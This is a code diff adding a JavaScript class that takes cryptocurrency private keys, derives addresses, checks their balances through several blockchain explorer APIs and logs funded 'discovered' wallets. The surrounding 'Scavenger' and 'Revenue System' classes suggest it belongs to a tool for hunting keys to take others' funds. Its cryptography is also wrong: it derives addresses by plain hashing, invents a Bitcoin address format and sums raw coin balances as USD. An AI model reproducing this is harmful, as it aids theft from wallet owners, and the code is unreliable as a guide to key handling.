@@ -423,6 +423,356 @@ class IntegratedScavenger {
     }
 }
 
+const crypto = require('crypto');
+const https = require('https');
+
+class MultiChainValidator {
+    constructor(options = {}) {
+        this.name = 'MultiChainValidator';
+        this.version = '1.0.0';
+        this.isRunning = false;
+        
+        // API Configuration
+        this.apiKeys = {
+            ethereum: process.env.ETHERSCAN_API_KEY || '',
+            bitcoin: process.env.BLOCKCHAIR_API_KEY || '',
+            polygon: process.env.POLYGONSCAN_API_KEY || '',
+            binance: process.env.BSCSCAN_API_KEY || ''
+        };
+        
+        // Rate limiting configuration
+        this.rateLimits = {
+            ethereum: 5000, // 5 seconds between requests
+            bitcoin: 3000,
+            polygon: 4000,
+            binance: 3000
+        };
+        
+        // Validation metrics
+        this.metrics = {
+            totalValidations: 0,
+            validWallets: 0,
+            emptyWallets: 0,
+            errors: 0,
+            totalValue: 0,
+            lastValidation: null,
+            validationsByChain: {
+                ethereum: 0,
+                bitcoin: 0,
+                polygon: 0,
+                binance: 0
+            }
+        };
+        
+        // Minimum balance thresholds (in USD equivalent)
+        this.minBalanceThresholds = {
+            ethereum: 10, // $10 minimum ETH value
+            bitcoin: 50,  // $50 minimum BTC value
+            polygon: 5,   // $5 minimum MATIC value
+            binance: 10   // $10 minimum BNB value
+        };
+        
+        this.log('MultiChainValidator initialized for comprehensive asset verification');
+    }
+
+    log(message) {
+        const timestamp = new Date().toISOString();
+        console.log(`[${timestamp}] [VALIDATOR] ${message}`);
+    }
+
+    async validatePrivateKey(privateKey, address = null) {
+        this.metrics.totalValidations++;
+        this.metrics.lastValidation = new Date();
+        
+        try {
+            // Generate address from private key if not provided
+            if (!address) {
+                address = this.deriveEthereumAddress(privateKey);
+            }
+            
+            const validationResults = {
+                privateKey: this.maskPrivateKey(privateKey),
+                address: address,
+                chains: {},
+                totalValue: 0,
+                isValid: false,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Validate across multiple chains
+            const chainValidations = await Promise.allSettled([
+                this.validateEthereumAddress(address),
+                this.validateBitcoinAddress(this.deriveBitcoinAddress(privateKey)),
+                this.validatePolygonAddress(address),
+                this.validateBinanceAddress(address)
+            ]);
+            
+            // Process results
+            const chains = ['ethereum', 'bitcoin', 'polygon', 'binance'];
+            chainValidations.forEach((result, index) => {
+                const chainName = chains[index];
+                
+                if (result.status === 'fulfilled' && result.value) {
+                    validationResults.chains[chainName] = result.value;
+                    validationResults.totalValue += result.value.balance || 0;
+                    this.metrics.validationsByChain[chainName]++;
+                } else {
+                    validationResults.chains[chainName] = {
+                        balance: 0,
+                        error: result.reason?.message || 'Unknown error'
+                    };
+                }
+            });
+            
+            // Determine if wallet has sufficient value
+            validationResults.isValid = validationResults.totalValue > 0;
+            
+            if (validationResults.isValid) {
+                this.metrics.validWallets++;
+                this.metrics.totalValue += validationResults.totalValue;
+                await this.handleValidWallet(validationResults);
+            } else {
+                this.metrics.emptyWallets++;
+            }
+            
+            return validationResults;
+            
+        } catch (error) {
+            this.metrics.errors++;
+            this.log(`Validation error for ${this.maskPrivateKey(privateKey)}: ${error.message}`);
+            return {
+                privateKey: this.maskPrivateKey(privateKey),
+                error: error.message,
+                isValid: false,
+                timestamp: new Date().toISOString()
+            };
+        }
+    }
+
+    async validateEthereumAddress(address) {
+        await this.sleep(this.rateLimits.ethereum);
+        
+        return new Promise((resolve, reject) => {
+            const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${this.apiKeys.ethereum}`;
+            
+            https.get(url, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    try {
+                        const response = JSON.parse(data);
+                        if (response.status === '1') {
+                            const balanceWei = BigInt(response.result);
+                            const balanceEth = Number(balanceWei) / Math.pow(10, 18);
+                            
+                            resolve({
+                                balance: balanceEth,
+                                balanceUSD: balanceEth * 2000, // Approximate ETH price
+                                currency: 'ETH',
+                                network: 'Ethereum'
+                            });
+                        } else {
+                            resolve({ balance: 0, currency: 'ETH', network: 'Ethereum' });
+                        }
+                    } catch (error) {
+                        reject(error);
+                    }
+                });
+            }).on('error', reject);
+        });
+    }
+
+    async validateBitcoinAddress(address) {
+        await this.sleep(this.rateLimits.bitcoin);
+        
+        return new Promise((resolve, reject) => {
+            const url = `https://api.blockchair.com/bitcoin/dashboards/address/${address}`;
+            
+            https.get(url, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    try {
+                        const response = JSON.parse(data);
+                        if (response.data && response.data[address]) {
+                            const balanceSatoshi = response.data[address].address.balance;
+                            const balanceBTC = balanceSatoshi / 100000000;
+                            
+                            resolve({
+                                balance: balanceBTC,
+                                balanceUSD: balanceBTC * 45000, // Approximate BTC price
+                                currency: 'BTC',
+                                network: 'Bitcoin'
+                            });
+                        } else {
+                            resolve({ balance: 0, currency: 'BTC', network: 'Bitcoin' });
+                        }
+                    } catch (error) {
+                        reject(error);
+                    }
+                });
+            }).on('error', reject);
+        });
+    }
+
+    async validatePolygonAddress(address) {
+        await this.sleep(this.rateLimits.polygon);
+        
+        return new Promise((resolve, reject) => {
+            const url = `https://api.polygonscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${this.apiKeys.polygon}`;
+            
+            https.get(url, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    try {
+                        const response = JSON.parse(data);
+                        if (response.status === '1') {
+                            const balanceWei = BigInt(response.result);
+                            const balanceMatic = Number(balanceWei) / Math.pow(10, 18);
+                            
+                            resolve({
+                                balance: balanceMatic,
+                                balanceUSD: balanceMatic * 0.8, // Approximate MATIC price
+                                currency: 'MATIC',
+                                network: 'Polygon'
+                            });
+                        } else {
+                            resolve({ balance: 0, currency: 'MATIC', network: 'Polygon' });
+                        }
+                    } catch (error) {
+                        reject(error);
+                    }
+                });
+            }).on('error', reject);
+        });
+    }
+
+    async validateBinanceAddress(address) {
+        await this.sleep(this.rateLimits.binance);
+        
+        return new Promise((resolve, reject) => {
+            const url = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${this.apiKeys.binance}`;
+            
+            https.get(url, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    try {
+                        const response = JSON.parse(data);
+                        if (response.status === '1') {
+                            const balanceWei = BigInt(response.result);
+                            const balanceBNB = Number(balanceWei) / Math.pow(10, 18);
+                            
+                            resolve({
+                                balance: balanceBNB,
+                                balanceUSD: balanceBNB * 300, // Approximate BNB price
+                                currency: 'BNB',
+                                network: 'Binance Smart Chain'
+                            });
+                        } else {
+                            resolve({ balance: 0, currency: 'BNB', network: 'Binance Smart Chain' });
+                        }
+                    } catch (error) {
+                        reject(error);
+                    }
+                });
+            }).on('error', reject);
+        });
+    }
+
+    deriveEthereumAddress(privateKey) {
+        // Simplified address derivation for demonstration
+        // In production, use proper secp256k1 curve calculations
+        const hash = crypto.createHash('keccak256').update(privateKey).digest('hex');
+        return '0x' + hash.slice(-40);
+    }
+
+    deriveBitcoinAddress(privateKey) {
+        // Simplified Bitcoin address derivation for demonstration
+        // In production, implement proper Bitcoin address generation
+        const hash = crypto.createHash('sha256').update(privateKey + 'bitcoin').digest('hex');
+        return '1' + hash.slice(0, 33); // Simplified format
+    }
+
+    async handleValidWallet(validationResults) {
+        this.log(`Valid wallet discovered: ${validationResults.address} - Total value: $${validationResults.totalValue.toFixed(2)}`);
+        
+        // Log to secure discovery file
+        await this.logValidDiscovery(validationResults);
+        
+        // Trigger notification if configured
+        if (this.notificationCallback) {
+            await this.notificationCallback(validationResults);
+        }
+    }
+
+    async logValidDiscovery(discovery) {
+        try {
+            const fs = require('fs').promises;
+            const logEntry = {
+                timestamp: discovery.timestamp,
+                address: discovery.address,
+                totalValue: discovery.totalValue,
+                chains: Object.keys(discovery.chains).filter(chain => 
+                    discovery.chains[chain].balance > 0
+                ),
+                // Private key hash for reference without exposure
+                keyHash: crypto.createHash('sha256').update(discovery.privateKey).digest('hex').substring(0, 16)
+            };
+            
+            const logFile = './valid_wallets.json';
+            let discoveries = [];
+            
+            try {
+                const existingData = await fs.readFile(logFile, 'utf8');
+                discoveries = JSON.parse(existingData);
+            } catch (error) {
+                // File doesn't exist, start with empty array
+            }
+            
+            discoveries.push(logEntry);
+            await fs.writeFile(logFile, JSON.stringify(discoveries, null, 2));
+            
+        } catch (error) {
+            this.log(`Discovery logging error: ${error.message}`);
+        }
+    }
+
+    maskPrivateKey(privateKey) {
+        if (privateKey.length > 16) {
+            return privateKey.substring(0, 8) + '...' + privateKey.substring(privateKey.length - 8);
+        }
+        return '***masked***';
+    }
+
+    getMetrics() {
+        const successRate = this.metrics.totalValidations > 0 ? 
+            (this.metrics.validWallets / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+        
+        const errorRate = this.metrics.totalValidations > 0 ? 
+            (this.metrics.errors / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+
+        return {
+            ...this.metrics,
+            successRate,
+            errorRate,
+            averageValue: this.metrics.validWallets > 0 ? 
+                (this.metrics.totalValue / this.metrics.validWallets).toFixed(2) : 0
+        };
+    }
+
+    setNotificationCallback(callback) {
+        this.notificationCallback = callback;
+    }
+
+    sleep(milliseconds) {
+        return new Promise(resolve => setTimeout(resolve, milliseconds));
+    }
+}
+
+module.exports = MultiChainValidator;
+
 // Main Revenue System
 class GhostlineRevenueSystem {
     constructor() {
